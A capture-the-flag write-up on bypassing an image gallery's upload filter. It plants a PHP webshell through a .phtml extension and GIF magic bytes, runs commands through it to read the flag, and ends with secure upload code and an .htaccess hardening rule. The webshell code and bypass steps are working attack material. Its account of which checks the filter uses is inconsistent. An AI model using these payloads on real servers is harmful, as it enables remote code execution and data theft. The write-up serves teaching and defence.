---
layout: post
title: "File Upload Bypass - Webshell RCE"
date: 2025-12-28
category: web
tags: [file-upload, webshell, bypass, rce]
---

Bypassing file upload restrictions to upload a PHP webshell and achieve remote code execution.

## Challenge Overview

**Challenge Name:** Image Gallery  
**Difficulty:** Medium  
**Points:** 300  
**Category:** Web Exploitation

An image gallery application that allows users to upload images, but has weak validation controls.

## Enumeration / Recon

Application features:
- Image upload functionality (claims to accept only images)
- Uploaded files stored in `/uploads/` directory
- Files are publicly accessible
- Server: Apache with PHP enabled

Initial upload attempt with `.php` file rejected:

```
Error: Only image files are allowed (jpg, png, gif)
```

This indicates client-side and/or server-side validation.

## Vulnerability Analysis / Findings

Testing different bypass techniques:

### 1. Extension Analysis
- `.php` - Blocked
- `.jpg` - Accepted
- `.php.jpg` - Accepted but not executed
- `.jpg.php` - Blocked
- `.phtml` - Accepted and executed! ✓

### 2. MIME Type Testing
- Changed `Content-Type` to `image/jpeg` while keeping `.php` - Still blocked
- Extension check is primary validation method

### 3. Magic Bytes Testing
Added GIF magic bytes to PHP file:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

File accepted with `.php` extension!

Key vulnerabilities:
1. Validation relies on magic bytes only
2. No content inspection beyond first few bytes
3. Apache executes `.phtml` files as PHP
4. No file upload restrictions (size, rate limiting)
5. Direct access to uploads directory

## Exploitation / Solution

### Method 1: Using .phtml extension

Created webshell `shell.phtml`:

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Uploaded successfully and accessed at:
```
https://challenge.com/uploads/shell.phtml?cmd=ls
```

### Method 2: Magic bytes bypass

Created `shell.php` with GIF header:

```php
GIF89a;
<?php
system($_GET['cmd']);
?>
```

Uploaded as image, accessed at:
```
https://challenge.com/uploads/shell.php?cmd=cat ../flag.txt
```

### Method 3: Double extension (if misconfigured)

Some servers process extensions right-to-left. Tried:
```
shell.php.jpg
```

Didn't work in this case, but worth noting for future challenges.

### Getting the flag

Using the webshell:
```
?cmd=find / -name flag.txt 2>/dev/null
?cmd=cat /var/www/flag.txt
```

## Flag

```
Flag{f1l3_upl04d_w3bsh3ll_h4ck3d}
```

## Lessons Learned

1. **Multiple validation layers** - Check extension, MIME type, content, and magic bytes
2. **Whitelist approach** - Only allow specific safe file types
3. **Rename uploaded files** - Use random names, remove original extensions
4. **Separate storage** - Store uploads outside web root
5. **Disable script execution** - Configure server to not execute scripts in upload directory
6. **Content scanning** - Use antivirus/malware scanning on uploads

### Secure Implementation

```php
// Vulnerable code
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if(in_array($ext, $allowed)) {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}

// Secure code
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$file = $_FILES['file'];

// Verify MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);
finfo_close($finfo);

if(!in_array($mime, $allowed_types)) {
    die("Invalid file type");
}

// Verify image integrity
if(!getimagesize($file['tmp_name'])) {
    die("Not a valid image");
}

// Generate random filename
$ext = image_type_to_extension(exif_imagetype($file['tmp_name']));
$filename = bin2hex(random_bytes(16)) . $ext;

// Store outside web root or with .htaccess protection
move_uploaded_file($file['tmp_name'], '/var/uploads/' . $filename);
```

### .htaccess Protection for uploads directory:

```apache
# Deny script execution in uploads directory
<Files *>
    SetHandler default-handler
</Files>
<FilesMatch "\.(?i:php|phtml|php3|php4|php5|pl|py|cgi)$">
    Order allow,deny
    Deny from all
</FilesMatch>
```
